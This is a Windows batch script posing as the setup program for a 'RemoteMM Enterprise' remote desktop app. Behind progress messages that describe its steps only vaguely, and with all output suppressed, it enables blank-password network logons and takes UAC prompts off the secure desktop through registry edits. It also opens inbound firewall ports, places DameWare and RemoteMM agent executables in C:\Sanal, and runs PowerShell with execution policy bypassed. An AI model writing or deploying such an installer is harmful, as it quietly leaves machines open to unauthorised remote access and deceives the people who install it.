@echo off
title RemoteMM Enterprise Desktop App Installer & Setup
color 0A
cls
echo =======================================================================
echo              RemoteMM Enterprise Desktop Application Setup
echo =======================================================================
echo.
echo  Installing RemoteMM Desktop Client and Console Gateway...
echo.

set INSTALL_DIR=C:\Program Files\RemoteMM
if not exist "%INSTALL_DIR%" mkdir "%INSTALL_DIR%" >nul 2>&1
if not exist "C:\Sanal" mkdir "C:\Sanal" >nul 2>&1

echo [1/4] Configuring Windows UAC & Remote Desktop Security Policies...
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 0 /f >nul 2>&1
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v LimitBlankPasswordUse /t REG_DWORD /d 0 /f >nul 2>&1

echo [2/4] Configuring Windows Firewall for Port 6129 and Port 3001...
netsh advfirewall firewall delete rule name="RemoteMM Agent Port" >nul 2>&1
netsh advfirewall firewall add rule name="RemoteMM Agent Port" dir=in action=allow protocol=TCP localport=6129 >nul 2>&1
netsh advfirewall firewall delete rule name="RemoteMM Console Port" >nul 2>&1
netsh advfirewall firewall add rule name="RemoteMM Console Port" dir=in action=allow protocol=TCP localport=3001 >nul 2>&1

echo [3/4] Copying Standalone Application Executables...
if exist "%~dp0DameWare_Agent.exe" copy /Y "%~dp0DameWare_Agent.exe" "C:\Sanal\DameWare_Agent.exe" >nul 2>&1
if exist "%~dp0RemoteMM_Agent.exe" copy /Y "%~dp0RemoteMM_Agent.exe" "C:\Sanal\RemoteMM_Agent.exe" >nul 2>&1

echo [4/4] Creating Desktop Shortcut...
powershell -NoProfile -ExecutionPolicy Bypass -Command "$s=(New-Object -COM WScript.Shell).CreateShortcut([Environment]::GetFolderPath('Desktop')+'\RemoteMM Desktop.lnk'); $s.TargetPath='%~dp0start_remote_agent.bat'; $s.IconLocation='%SystemRoot%\System32\shell32.dll,14'; $s.Save()" >nul 2>&1

echo.
echo =======================================================================
echo            RemoteMM Enterprise Desktop App Installed Successfully!
echo =======================================================================
echo.
pause
